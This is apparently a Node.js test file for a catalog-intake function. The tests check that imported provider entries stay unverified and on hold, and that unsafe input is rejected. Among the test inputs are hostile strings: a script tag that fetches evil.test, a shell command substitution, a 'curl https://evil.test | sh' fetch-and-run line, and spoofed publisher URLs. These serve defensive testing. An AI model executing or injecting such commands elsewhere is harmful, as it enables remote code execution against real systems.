import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { importCatalog, PINNED_SHA } from '../src/catalog-intake.mjs';

const entry = (id = 'apify-ai-code-sandbox') => ({ id,
  publisherUrl: 'https://apify.com', availability: 'unknown',
  permissions: [], action: 'DISCOVERY_ONLY' });
const fixture = () => ({ sha: PINNED_SHA,
  capturedAt: '2026-10-31T12:00:00.000Z', entries: [entry()] });

test('offline projection is deterministic, immutable to input and always on HOLD', () => {
  const input = fixture();
  input.entries.push(entry('apify-ai-web-agent'));
  const before = structuredClone(input);
  const result = importCatalog(input);
  assert.deepEqual(input, before);
  assert.deepEqual(result, importCatalog({ ...input, entries: [...input.entries].reverse() }));
  assert.equal(result.nodes.length, 2);
  assert.equal(result.edges.length, 2);
  for (const node of result.nodes) {
    assert.equal(node.tag, 'DISCOVERY_ONLY');
    assert.equal(node.runtime, 'UNVERIFIED');
    assert.equal(node.decision, 'HOLD');
    assert.equal(node.connectionApproved, false);
    assert.equal(Object.keys(node.assessment).length, 10);
    assert.equal(node.publisherUrl, 'https://apify.com');
  }
  const { receipt, ...graph } = result;
  assert.equal(receipt.digest, createHash('sha256').update(JSON.stringify(graph)).digest('hex'));
  assert.equal(receipt.signed, false);
  const changed = fixture();
  changed.capturedAt = '2026-11-01T12:00:00.000Z';
  assert.notEqual(importCatalog(changed).receipt.digest, importCatalog(fixture()).receipt.digest);
});

for (const malicious of ['[run](javascript:alert(1))', '<script>fetch("https://evil.test")</script>',
  '$(touch /tmp/catalog-pwned)', '```sh\ncurl https://evil.test | sh\n```']) {
  test(`rejects Markdown/command input: ${JSON.stringify(malicious)}`, () => {
    assert.throws(() => importCatalog(malicious), TypeError);
    const input = fixture(); input.entries[0].id = malicious;
    assert.throws(() => importCatalog(input), TypeError);
    input.entries = [entry()]; input.markdown = malicious;
    assert.throws(() => importCatalog(input), TypeError);
  });
}
for (const url of ['https://apify.com.evil.test', 'https://apify.com@evil.test',
  'https://apify.com/?ref=affiliate', 'https://evil.test/?next=https://apify.com',
  'http://apify.com', 'https://apify.com/']) {
  test(`denies spoofed or affiliate publisher URL ${url}`, () => {
    const input = fixture(); input.entries[0].publisherUrl = url;
    assert.throws(() => importCatalog(input), TypeError);
  });
}
test('denies duplicate candidates, stale SHA, unknown providers and bad timestamps', () => {
  for (const mutate of [i => i.entries.push(entry()), i => i.sha = 'main',
    i => i.sha = '0'.repeat(40), i => i.entries[0].id = 'other-provider',
    i => i.capturedAt = '2026-02-30T12:00:00.000Z']) {
    const input = fixture(); mutate(input);
    assert.throws(() => importCatalog(input), TypeError);
  }
});
test('unavailable and claimed available providers remain unverified HOLD', () => {
  for (const availability of ['unavailable', 'available']) {
    const input = fixture(); input.entries[0].availability = availability;
    const node = importCatalog(input).nodes[0];
    assert.equal(node.availability, availability);
    assert.equal(node.decision, 'HOLD');
    assert.equal(node.connectionApproved, false);
  }
});
test('default denies permissions, credentials, install and write actions', () => {
  for (const action of [undefined, 'write', 'install', 'execute', 'connect']) {
    const input = fixture(); input.entries[0].action = action;
    assert.throws(() => importCatalog(input), TypeError);
  }
  for (const permissions of [['read'], ['network'], ['write'], {}, null]) {
    const input = fixture(); input.entries[0].permissions = permissions;
    assert.throws(() => importCatalog(input), TypeError);
  }
  for (const field of ['credentials', 'command', 'token', 'endpoint']) {
    const input = fixture(); input.entries[0][field] = 'untrusted';
    assert.throws(() => importCatalog(input), TypeError);
  }
});
